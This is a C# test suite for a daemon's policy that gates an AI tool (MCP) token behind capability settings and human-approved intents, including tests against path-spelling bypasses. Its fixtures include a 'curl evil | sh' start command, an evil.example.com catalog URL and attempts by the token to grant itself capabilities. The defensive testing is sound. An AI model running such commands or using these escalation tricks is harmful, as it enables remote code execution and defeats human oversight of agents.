using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Dapper;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Routing;
using Microsoft.AspNetCore.Routing.Patterns;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Moq;
using NKS.WebDevConsole.Core.Interfaces;
using NKS.WebDevConsole.Daemon.Config;
using NKS.WebDevConsole.Daemon.Data;
using NKS.WebDevConsole.Daemon.Mcp;
using NKS.WebDevConsole.Daemon.Services;

namespace NKS.WebDevConsole.Daemon.Tests;

public class McpTokenPolicyTests
{
    // --- helpers -------------------------------------------------------------

    private static HttpContext Request(string method, string? routePattern, string? jsonBody = null,
        IDictionary<string, string>? routeValues = null, string? intentToken = null)
    {
        var ctx = new DefaultHttpContext();
        ctx.Request.Method = method;
        ctx.Request.Path = routePattern is null ? "/api/x" : Regex.Replace(routePattern, @"\{([^{}]*)\}", "$1");
        if (routePattern is not null)
        {
            ctx.SetEndpoint(new RouteEndpoint(
                _ => Task.CompletedTask, RoutePatternFactory.Parse(routePattern), 0, EndpointMetadataCollection.Empty, routePattern));
        }
        foreach (var (k, v) in routeValues ?? new Dictionary<string, string>())
            ctx.Request.RouteValues[k] = v;
        if (intentToken is not null)
            ctx.Request.Headers["X-Intent-Token"] = intentToken;
        if (jsonBody is not null)
        {
            ctx.Request.ContentType = "application/json";
            ctx.Request.Body = new MemoryStream(Encoding.UTF8.GetBytes(jsonBody));
        }
        return ctx;
    }

    private static readonly Func<string, bool> AllOff = _ => false;
    private static readonly Func<string, bool> AllOn = _ => true;
    private static Func<string, bool> Only(params string[] ids) => ids.Contains;

    private static Mock<IDeployIntentValidator> Validator(bool ok, string reason = "not_found")
    {
        var v = new Mock<IDeployIntentValidator>();
        v.Setup(x => x.ValidateAndConsumeAsync(It.IsAny<string>(), It.IsAny<string>(), It.IsAny<string>(),
                It.IsAny<string>(), It.IsAny<bool>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(ok ? IntentValidationResult.Allow() : IntentValidationResult.Deny(reason));
        return v;
    }

    private static JsonElement BodyOf(McpDenial denial) =>
        JsonSerializer.SerializeToElement(denial.Body, denial.Body.GetType());

    private static void AssertCapabilityDisabled(McpDenial? denial, string capability)
    {
        Assert.NotNull(denial);
        Assert.Equal(403, denial!.StatusCode);
        var body = BodyOf(denial);
        Assert.Equal("mcp_capability_disabled", body.GetProperty("error").GetString());
        Assert.Equal(capability, body.GetProperty("capability").GetString());
        Assert.Equal("mcp.capabilities." + capability, body.GetProperty("settingKey").GetString());
        Assert.Contains("WDC → Settings → MCP", body.GetProperty("hint").GetString());
    }

    // --- trust root ----------------------------------------------------------

    [Theory]
    [InlineData("POST", "/api/mcp/intents/{intentId}/confirm")]
    [InlineData("POST", "/api/mcp/intents/{intentId}/revoke")]
    [InlineData("POST", "/api/mcp/grants")]
    [InlineData("PATCH", "/api/mcp/grants/{id}")]
    [InlineData("DELETE", "/api/mcp/grants/{id}")]
    [InlineData("POST", "/api/mcp/grants/import")]
    [InlineData("POST", "/api/mcp/some-future-route")]
    public async Task Trust_root_is_refused_even_with_every_capability_on(string method, string pattern)
    {
        var denial = await McpTokenPolicy.EvaluateAsync(Request(method, pattern), AllOn, Validator(true).Object);
        Assert.NotNull(denial);
        Assert.Equal("mcp_forbidden", BodyOf(denial!).GetProperty("error").GetString());
    }

    [Theory]
    [InlineData("""{"mcp.capabilities.database_admin":"true"}""")]
    [InlineData("""{"MCP.Capabilities.unlisted_routes":"true","ports.http":"8080"}""")]
    [InlineData("""{"mcp.always_confirm_kinds":""}""")]
    [InlineData("""{" mcp.enabled ":"true"}""")]
    public async Task Mcp_token_cannot_change_mcp_settings_even_with_operator_settings_on(string body)
    {
        var denial = await McpTokenPolicy.EvaluateAsync(Request("PUT", "/api/settings", body), AllOn, null);
        Assert.NotNull(denial);
        Assert.Equal("mcp_forbidden", BodyOf(denial!).GetProperty("error").GetString());
    }

    // --- always allowed ------------------------------------------------------

    [Theory]
    [InlineData("GET", "/api/sites")]
    [InlineData("HEAD", "/api/sites")]
    [InlineData("DELETE", "/api/sites/{domain}")]
    [InlineData("POST", "/api/services/{serviceId}/start")]
    [InlineData("POST", "/api/mcp/intents")]
    [InlineData("POST", "/api/mcp/intents/confirm-request")]
    [InlineData("GET", "/api/mcp/intents/{intentId}")]
    [InlineData("POST", "/api/mcp/tool-calls")]
    [InlineData("GET", "/api/mcp/capabilities")]
    [InlineData("POST", "/api/nks.wdc.deploy/sites/{domain}/snapshots/{deployId}/restore")]
    public async Task Routes_the_shipped_tools_use_pass_with_every_capability_off(string method, string pattern)
    {
        Assert.Null(await McpTokenPolicy.EvaluateAsync(Request(method, pattern), AllOff, null));
    }

    [Fact]
    public async Task Ordinary_settings_and_basic_site_fields_pass_with_every_capability_off()
    {
        Assert.Null(await McpTokenPolicy.EvaluateAsync(Request("PUT", "/api/settings", """{"ports.http":"8080"}"""), AllOff, null));
        Assert.Null(await McpTokenPolicy.EvaluateAsync(Request("POST", "/api/sites",
            """{"domain":"a.loc","documentRoot":"/srv/a","phpVersion":"8.3","sslEnabled":true,"aliases":[],"framework":"","nodeStartCommand":""}"""), AllOff, null));
        Assert.Null(await McpTokenPolicy.EvaluateAsync(Request("PUT", "/api/cloudflare/config", """{"defaultZoneId":"z","tunnelName":"t"}"""), AllOff, null));
    }

    [Fact]
    public async Task The_request_body_stays_readable_for_the_endpoint()
    {
        const string body = """{"ports.http":"8080"}""";
        var ctx = Request("PUT", "/api/settings", body);
        Assert.Null(await McpTokenPolicy.EvaluateAsync(ctx, AllOff, null));
        using var reader = new StreamReader(ctx.Request.Body);
        Assert.Equal(body, await reader.ReadToEndAsync());
    }

    // --- every capability: off → 403 with the payload ---------------------------

    public static TheoryData<string, string, string?, string> CapabilityRequests => new()
    {
        { McpCapabilities.SettingsOperator, "PUT /api/settings", """{"daemon.catalogUrl":"https://evil.example.com"}""", "" },
        { McpCapabilities.ServiceConfig, "POST /api/services/{id}/config", "{}", "id=apache" },
        { McpCapabilities.HostsFile, "POST /api/hosts/restore", "{}", "" },
        { McpCapabilities.HostsFile, "POST /api/hosts/apply", "{}", "" },
        { McpCapabilities.NodeProcess, "POST /api/node/sites/{domain}/start", null, "domain=app.loc" },
        { McpCapabilities.NodeProcess, "POST /api/sites", """{"domain":"app.loc","documentRoot":"/srv","nodeStartCommand":"curl evil | sh"}""", "" },
        { McpCapabilities.SiteAdvancedFields, "POST /api/sites", """{"domain":"a.loc","cloudflareTunnel":true}""", "" },
        { McpCapabilities.CloudflareCredentials, "PUT /api/cloudflare/config", """{"tunnelToken":"attacker"}""", "" },
        { McpCapabilities.CloudflareCredentials, "PUT /api/cloudflare/tunnels/{tunnelId}/configuration", "{}", "tunnelId=t1" },
        { McpCapabilities.PluginInstall, "POST /api/plugins/install", "{}", "" },
        { McpCapabilities.DatabaseAdmin, "POST /api/plugins/mysql/reset-password", """{"newPwd":"x"}""", "" },
        { McpCapabilities.DatabaseAdmin, "POST /api/plugins/mysql/users/drop", """{"userName":"app","host":"localhost"}""", "" },
        { McpCapabilities.DatabaseAdmin, "POST /api/plugins/postgresql/reset-password", "{}", "" },
        { McpCapabilities.DatabaseAdmin, "GET /api/databases/root-password", null, "" },
        { McpCapabilities.BackupRestore, "POST /api/restore", "{}", "" },
        { McpCapabilities.DeployConfig, "POST /api/nks.wdc.deploy/sites/{domain}/hooks/test", "{}", "domain=a.loc" },
        { McpCapabilities.DaemonAdmin, "POST /api/admin/restart", null, "" },
        { McpCapabilities.UnlistedRoutes, "PUT /api/sites/{domain}", "{}", "domain=a.loc" },
        { McpCapabilities.UnlistedRoutes, "GET /api/databases/{name}/export", null, "name=shop" },
        { McpCapabilities.UnlistedRoutes, "GET /api/mcp/grants", null, "" },
    };

    private static HttpContext RequestFor(string route, string? body, string routeValues, string? intentToken = null)
    {
        var parts = route.Split(' ', 2);
        var values = routeValues.Length == 0
            ? null
            : routeValues.Split(',').Select(kv => kv.Split('=')).ToDictionary(kv => kv[0], kv => kv[1]);
        return Request(parts[0], parts[1], body, values, intentToken);
    }

    [Theory]
    [MemberData(nameof(CapabilityRequests))]
    public async Task Capability_off_answers_403_with_the_capability_and_a_hint(string capability, string route, string? body, string routeValues)
    {
        var validator = Validator(true);
        var denial = await McpTokenPolicy.EvaluateAsync(RequestFor(route, body, routeValues), id => id != capability, validator.Object);
        AssertCapabilityDisabled(denial, capability);
        validator.VerifyNoOtherCalls();
    }

    [Theory]
    [MemberData(nameof(CapabilityRequests))]
    public async Task Capability_on_with_an_approved_intent_passes(string capability, string route, string? body, string routeValues)
    {
        var denial = await McpTokenPolicy.EvaluateAsync(
            RequestFor(route, body, routeValues, intentToken: "intent.token.sig"), Only(capability), Validator(true).Object);
        Assert.Null(denial);
    }

    // --- capability on: destructive operations still need an intent ----------

    public static TheoryData<string, string, string?, string, string, string, string> DaemonGatedIntents => new()
    {
        { McpCapabilities.ServiceConfig, "POST /api/services/{id}/config", "{}", "id=apache", "service_config_write", "apache", "*mcp*" },
        { McpCapabilities.HostsFile, "POST /api/hosts/restore", "{}", "", "hosts_write", "hosts", "*mcp*" },
        { McpCapabilities.NodeProcess, "POST /api/node/sites/{domain}/start", null, "domain=app.loc", "node_process", "app.loc", "*mcp*" },
        { McpCapabilities.NodeProcess, "POST /api/sites", """{"domain":"app.loc","nodeStartCommand":"npm start"}""", "", "node_process", "app.loc", "*mcp*" },
        { McpCapabilities.CloudflareCredentials, "PUT /api/cloudflare/config", """{"apiToken":"x"}""", "", "cloudflare_credentials", "config", "*mcp*" },
        { McpCapabilities.DaemonAdmin, "POST /api/admin/reset", null, "", "daemon_admin", "reset", "*mcp*" },
    };

    [Theory]
    [MemberData(nameof(DaemonGatedIntents))]
    public async Task Capability_on_still_needs_an_approved_intent(
        string capability, string route, string? body, string routeValues, string kind, string domain, string host)
    {
        var validator = Validator(false, "missing_token");
        var denial = await McpTokenPolicy.EvaluateAsync(RequestFor(route, body, routeValues), Only(capability, McpCapabilities.SiteAdvancedFields), validator.Object);

        Assert.NotNull(denial);
        Assert.Equal(403, denial!.StatusCode);
        var json = BodyOf(denial);
        Assert.Equal("intent_rejected", json.GetProperty("error").GetString());
        Assert.Equal(kind, json.GetProperty("intentKind").GetString());
        Assert.Equal(domain, json.GetProperty("intentDomain").GetString());
        Assert.Contains("wdc_request_confirmation", json.GetProperty("hint").GetString());
        validator.Verify(x => x.ValidateAndConsumeAsync("", kind, domain, host, false, It.IsAny<CancellationToken>()), Times.Once);
    }

    [Fact]
    public async Task An_intent_awaiting_approval_answers_425()
    {
        var denial = await McpTokenPolicy.EvaluateAsync(
            Request("POST", "/api/admin/restart", intentToken: "intent.token.sig"), Only(McpCapabilities.DaemonAdmin),
            Validator(false, "pending_confirmation").Object);
        Assert.Equal(425, denial!.StatusCode);
    }

    [Theory]
    [InlineData(McpCapabilities.PluginInstall, "POST", "/api/plugins/install")]
    [InlineData(McpCapabilities.BackupRestore, "POST", "/api/restore")]
    [InlineData(McpCapabilities.DeployConfig, "PUT", "/api/nks.wdc.deploy/sites/{domain}/settings")]
    [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/plugins/mysql/reset-password")]
    [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/plugins/mysql/users/drop")]
    [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/plugins/postgresql/reset-password")]
    public async Task Routes_whose_endpoint_checks_the_intent_are_not_checked_twice(string capability, string method, string pattern)
    {
        var validator = Validator(false);
        Assert.Null(await McpTokenPolicy.EvaluateAsync(Request(method, pattern, "{}"), Only(capability), validator.Object));
        validator.VerifyNoOtherCalls();
    }

    [Fact]
    public async Task A_request_matching_no_route_falls_under_unlisted_routes()
    {
        AssertCapabilityDisabled(await McpTokenPolicy.EvaluateAsync(Request("GET", routePattern: null), AllOff, null), McpCapabilities.UnlistedRoutes);
        Assert.Null(await McpTokenPolicy.EvaluateAsync(Request("GET", routePattern: null), Only(McpCapabilities.UnlistedRoutes), null));
    }

    [Theory]
    [InlineData("/api/sites/{domain}", "/api/sites/{*}")]
    [InlineData("API/Sites/{domain}/", "/api/sites/{*}")]
    [InlineData("/api//sites//{d:int}", "/api/sites/{*}")]
    [InlineData("/api/files/{**rest}", "/api/files/{*}")]
    public void Patterns_are_compared_in_a_canonical_form(string pattern, string expected)
    {
        Assert.Equal(expected, McpTokenPolicy.CanonicalPattern(pattern));
    }

    // --- the capability list stays in sync with the MCP tools and the daemon ----

    private static string RepoRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, "WebDevConsole.sln")))
            dir = dir.Parent;
        return dir?.FullName ?? throw new InvalidOperationException("WebDevConsole.sln not found above " + AppContext.BaseDirectory);
    }

    private static string Canonical(string method, string pattern) =>
        method.ToUpperInvariant() + " " + McpTokenPolicy.CanonicalPattern(pattern);

    private static HashSet<string> Canonical(IEnumerable<McpRoute> routes) =>
        routes.Select(r => Canonical(r.Method, r.Pattern)).ToHashSet();

    private static HashSet<string> ToolRoutes()
    {
        var fixture = Path.Combine(RepoRoot(), "services", "mcp-server", "daemon-routes.json");
        using var doc = JsonDocument.Parse(File.ReadAllText(fixture));
        return doc.RootElement.GetProperty("routes").EnumerateArray()
            .Select(e => e.GetString()!.Split(' ', 2))
            .Select(p => Canonical(p[0], p[1]))
            .ToHashSet();
    }

    /// <summary>
    /// services/mcp-server/daemon-routes.json lists the routes the MCP server
    /// calls (src/daemonRoutes.test.ts there checks it against the sources).
    /// Each must be always allowed or belong to a capability; and every always
    /// allowed route must be one the tools call (or the capability list).
    /// </summary>
    [Fact]
    public void Every_route_the_mcp_tools_call_is_classified()
    {
        var always = Canonical(McpCapabilities.AlwaysAllowed);
        var grouped = Canonical(McpCapabilities.All.SelectMany(c => c.Routes));
        var tools = ToolRoutes();

        var unclassified = tools.Where(r => !always.Contains(r) && !grouped.Contains(r)).ToList();
        Assert.True(unclassified.Count == 0, "tool routes in no tier: " + string.Join(", ", unclassified));
        var unused = always.Where(r => !tools.Contains(r) && r != Canonical("GET", "/api/mcp/capabilities")).ToList();
        Assert.True(unused.Count == 0, "always-allowed routes no tool calls: " + string.Join(", ", unused));
        Assert.Empty(always.Intersect(grouped));
    }

    [Fact]
    public void Capabilities_have_unique_ids_and_routes_and_dangerous_ones_default_off()
    {
        Assert.Equal(McpCapabilities.All.Count, McpCapabilities.All.Select(c => c.Id).Distinct().Count());
        var routes = McpCapabilities.All.SelectMany(c => c.Routes).Select(r => Canonical(r.Method, r.Pattern)).ToList();
        Assert.Equal(routes.Count, routes.Distinct().Count());
        Assert.All(McpCapabilities.All, c => Assert.False(c.DefaultEnabled));
        Assert.All(McpCapabilities.All, c => Assert.StartsWith("mcp.capabilities.", c.SettingKey));
    }

    // Routes served by the nks.wdc.deploy plugin (sibling plugins repo), not
    // by daemon sources in this repo.
    private static readonly string[] PluginRoutes =
    [
        "POST /api/nks.wdc.deploy/sites/{*}/hosts/{*}/deploy",
        "GET /api/nks.wdc.deploy/sites/{*}/groups/{*}",
    ];

    [Fact]
    public void Every_listed_route_exists_in_the_daemon()
    {
        var srcDir = Path.Combine(RepoRoot(), "src", "daemon", "NKS.WebDevConsole.Daemon");
        var mapCall = new Regex(@"Map(Get|Post|Put|Delete|Patch)\(\s*""([^""]+)""");
        var declared = Directory.EnumerateFiles(srcDir, "*.cs", SearchOption.AllDirectories)
            .Where(f => !f.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}")
                        && !f.Contains($"{Path.DirectorySeparatorChar}bin{Path.DirectorySeparatorChar}"))
            .SelectMany(f => mapCall.Matches(File.ReadAllText(f)))
            .Select(m => Canonical(m.Groups[1].Value, m.Groups[2].Value))
            .ToHashSet();
        declared.UnionWith(PluginRoutes);

        var listed = McpCapabilities.AlwaysAllowed
            .Concat(McpCapabilities.All.SelectMany(c => c.Routes))
            .Concat(McpTokenPolicy.NeverAllowed)
            .Select(r => Canonical(r.Method, r.Pattern))
            .Concat(McpCapabilities.All.SelectMany(c => c.BodyFields).Select(f => Canonical(f.Method, f.Pattern)));
        var missing = listed.Where(r => !declared.Contains(r)).ToList();
        Assert.True(missing.Count == 0, "routes not declared by the daemon: " + string.Join(", ", missing));
    }

    [Fact]
    public void Capabilities_endpoint_lists_every_group_with_its_state()
    {
        var json = JsonSerializer.SerializeToElement(McpEndpoints.CapabilitiesResponse(Only(McpCapabilities.HostsFile)));
        Assert.Equal("mcp.capabilities.", json.GetProperty("settingPrefix").GetString());
        var caps = json.GetProperty("capabilities").EnumerateArray().ToList();
        Assert.Equal(McpCapabilities.All.Select(c => c.Id), caps.Select(c => c.GetProperty("id").GetString()));
        var hosts = caps.Single(c => c.GetProperty("id").GetString() == McpCapabilities.HostsFile);
        Assert.True(hosts.GetProperty("enabled").GetBoolean());
        Assert.False(hosts.GetProperty("defaultEnabled").GetBoolean());
        Assert.Equal("mcp.capabilities.hosts_file", hosts.GetProperty("settingKey").GetString());
        Assert.Contains(hosts.GetProperty("routes").EnumerateArray(),
            r => r.GetProperty("pattern").GetString() == "/api/hosts/restore" && r.GetProperty("intentBy").GetString() == "daemon");
        Assert.False(caps.Single(c => c.GetProperty("id").GetString() == McpCapabilities.DatabaseAdmin).GetProperty("enabled").GetBoolean());
        Assert.NotEmpty(json.GetProperty("alwaysAllowed").EnumerateArray());
        Assert.NotEmpty(json.GetProperty("neverAllowed").EnumerateArray());
    }

    // --- the production gate against real routing and settings -----------------

    private const string GuiToken = "gui-token-0123456789";
    private const string McpToken = "mcp-token-0123456789";

    private sealed class TestDaemon : IAsyncDisposable
    {
        public required WebApplication App { get; init; }
        public required HttpClient Client { get; init; }
        public required SettingsStore Settings { get; init; }
        public required string DbPath { get; init; }

        public async ValueTask DisposeAsync()
        {
            Client.Dispose();
            await App.DisposeAsync();
            Microsoft.Data.Sqlite.SqliteConnection.ClearAllPools();
            try { File.Delete(DbPath); } catch { /* best effort */ }
        }
    }

    private static async Task<TestDaemon> StartAsync()
    {
        var dbPath = Path.Combine(Path.GetTempPath(), "nks-mcp-policy-" + Guid.NewGuid().ToString("N") + ".db");
        var database = new Database(dbPath);
        using (var conn = database.CreateConnection())
        {
            conn.Execute("""
                CREATE TABLE settings (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    category TEXT NOT NULL, key TEXT NOT NULL, value TEXT NOT NULL,
                    value_type TEXT NOT NULL DEFAULT 'string', description TEXT,
                    is_readonly INTEGER NOT NULL DEFAULT 0,
                    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
                    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
                    UNIQUE(category, key));
                """);
        }
        var settings = new SettingsStore(database);

        var builder = WebApplication.CreateBuilder();
        builder.WebHost.UseUrls("http://127.0.0.1:0");
        builder.Logging.ClearProviders();
        builder.Services.AddSingleton(settings);
        var validator = Validator(false, "missing_token");
        builder.Services.AddSingleton<IDeployIntentValidator>(validator.Object);
        var app = builder.Build();
        app.UseDaemonAuth(GuiToken, McpToken);

        static IResult Ok() => Results.Ok(new { reached = true });
        app.MapGet("/api/sites", Ok);
        app.MapPost("/api/sites", Ok);
        app.MapPut("/api/sites/{domain}", (string domain) => Ok());
        app.MapGet("/api/settings", Ok);
        app.MapPut("/api/settings", Ok);
        app.MapPost("/api/mcp/intents", Ok);
        app.MapPost("/api/mcp/intents/confirm-request", Ok);
        app.MapPost("/api/mcp/intents/{intentId}/confirm", (string intentId) => Ok());
        app.MapPost("/api/services/{id}/start", (string id) => Ok());
        app.MapPost("/api/services/{id}/config", (string id) => Ok());
        app.MapPost("/api/hosts/restore", Ok);
        app.MapPost("/api/node/sites/{domain}/start", (string domain) => Ok());

        await app.StartAsync();
        return new TestDaemon
        {
            App = app,
            Client = new HttpClient { BaseAddress = new Uri(app.Urls.First()) },
            Settings = settings,
            DbPath = dbPath,
        };
    }

    private static async Task<(HttpStatusCode Status, string Body)> SendAsync(HttpClient client, string method, string path, string token, string? json = null)
    {
        // Keep the path exactly as written (double slashes included).
        using var req = new HttpRequestMessage(new HttpMethod(method), new Uri(client.BaseAddress!.GetLeftPart(UriPartial.Authority) + path));
        req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
        if (json is not null) req.Content = new StringContent(json, Encoding.UTF8, "application/json");
        using var res = await client.SendAsync(req);
        return (res.StatusCode, await res.Content.ReadAsStringAsync());
    }

    [Theory]
    [InlineData("POST", "/api/mcp/intents/x/confirm")]
    [InlineData("POST", "/api/mcp/intents/x/confirm/")]
    [InlineData("POST", "/API/MCP/INTENTS/x/CONFIRM")]
    [InlineData("POST", "/api/mcp/intents/x/confirm//")]
    [InlineData("POST", "/api//mcp/intents/x/confirm")]
    [InlineData("POST", "//api/mcp/intents/x/confirm")]
    public async Task Mcp_token_cannot_confirm_intents_through_any_path_spelling(string method, string path)
    {
        await using var d = await StartAsync();
        d.Settings.Set("mcp", "capabilities.unlisted_routes", "true");
        var (status, _) = await SendAsync(d.Client, method, path, McpToken, "{}");
        Assert.True(status is HttpStatusCode.Forbidden or HttpStatusCode.NotFound, $"{method} {path} answered {(int)status}");
    }

    [Theory]
    [InlineData("/api/settings")]
    [InlineData("/api/settings/")]
    [InlineData("/API/Settings")]
    [InlineData("/api//settings")]
    [InlineData("//api/settings")]
    public async Task Mcp_token_cannot_flip_a_capability_through_any_path_spelling(string path)
    {
        await using var d = await StartAsync();
        d.Settings.Set("mcp", "capabilities.settings_operator", "true");
        d.Settings.Set("mcp", "capabilities.unlisted_routes", "true");
        var (status, _) = await SendAsync(d.Client, "PUT", path, McpToken, """{"mcp.capabilities.database_admin":"true"}""");
        Assert.True(status is HttpStatusCode.Forbidden or HttpStatusCode.NotFound, $"PUT {path} answered {(int)status}");
    }

    [Theory]
    [InlineData("POST", "/api/services/httpd/config", "service_config")]
    [InlineData("POST", "/api/services/httpd/config/", "service_config")]
    [InlineData("POST", "/Api/Hosts/Restore/", "hosts_file")]
    [InlineData("POST", "/api/node/sites/a.loc/start", "node_process")]
    [InlineData("PUT", "/api/sites/a.loc", "unlisted_routes")]
    [InlineData("GET", "/api/does-not-exist", "unlisted_routes")]
    public async Task Disabled_capabilities_answer_the_documented_payload(string method, string path, string capability)
    {
        await using var d = await StartAsync();
        var (status, body) = await SendAsync(d.Client, method, path, McpToken, "{}");
        Assert.Equal(HttpStatusCode.Forbidden, status);
        using var doc = JsonDocument.Parse(body);
        Assert.Equal("mcp_capability_disabled", doc.RootElement.GetProperty("error").GetString());
        Assert.Equal(capability, doc.RootElement.GetProperty("capability").GetString());
        Assert.Contains("Settings → MCP", doc.RootElement.GetProperty("hint").GetString());
    }

    [Fact]
    public async Task An_enabled_capability_reaches_the_route_once_the_intent_is_approved()
    {
        await using var d = await StartAsync();
        d.Settings.Set("mcp", "capabilities.service_config", "true");

        // Enabled, but no approved intent yet.
        var (status, body) = await SendAsync(d.Client, "POST", "/api/services/httpd/config", McpToken, "{}");
        Assert.Equal(HttpStatusCode.Forbidden, status);
        Assert.Contains("intent_rejected", body);

        var validator = Mock.Get(d.App.Services.GetRequiredService<IDeployIntentValidator>());
        validator.Setup(x => x.ValidateAndConsumeAsync("approved.intent.sig", "service_config_write", "httpd", "*mcp*", false, It.IsAny<CancellationToken>()))
            .ReturnsAsync(IntentValidationResult.Allow());
        using var req = new HttpRequestMessage(HttpMethod.Post, d.Client.BaseAddress + "api/services/httpd/config")
        {
            Content = new StringContent("{}", Encoding.UTF8, "application/json"),
        };
        req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", McpToken);
        req.Headers.Add("X-Intent-Token", "approved.intent.sig");
        using var res = await d.Client.SendAsync(req);
        Assert.Equal(HttpStatusCode.OK, res.StatusCode);
    }

    [Theory]
    [InlineData("GET", "/api/sites", null)]
    [InlineData("GET", "/api/sites/", null)]
    [InlineData("POST", "/api/sites", """{"domain":"a.loc","documentRoot":"/srv/a"}""")]
    [InlineData("PUT", "/api/settings", """{"ports.http":"8080"}""")]
    [InlineData("PUT", "/api/settings/", """{"ports.http":"8080"}""")]
    [InlineData("POST", "/api/mcp/intents", "{}")]
    [InlineData("POST", "/api/mcp/intents/confirm-request", "{}")]
    [InlineData("POST", "/api/services/httpd/start", null)]
    public async Task Mcp_token_reaches_always_allowed_routes_by_default(string method, string path, string? body)
    {
        await using var d = await StartAsync();
        Assert.Equal(HttpStatusCode.OK, (await SendAsync(d.Client, method, path, McpToken, body)).Status);
    }

    [Theory]
    [InlineData("POST", "/api/services/httpd/config")]
    [InlineData("POST", "/api/hosts/restore")]
    [InlineData("PUT", "/api/settings")]
    [InlineData("POST", "/api/mcp/intents/x/confirm")]
    public async Task Gui_token_is_not_limited_by_mcp_capabilities(string method, string path)
    {
        await using var d = await StartAsync();
        Assert.Equal(HttpStatusCode.OK, (await SendAsync(d.Client, method, path, GuiToken, """{"mcp.capabilities.hosts_file":"true"}""")).Status);
    }

    [Theory]
    [InlineData("/api/sites")]
    [InlineData("//api/sites")]
    [InlineData("/API/sites")]
    public async Task Requests_without_a_token_are_refused_for_every_path_spelling(string path)
    {
        await using var d = await StartAsync();
        var (status, _) = await SendAsync(d.Client, "GET", path, "wrong-token");
        Assert.True(status is HttpStatusCode.Unauthorized or HttpStatusCode.NotFound, $"GET {path} answered {(int)status}");
    }
}
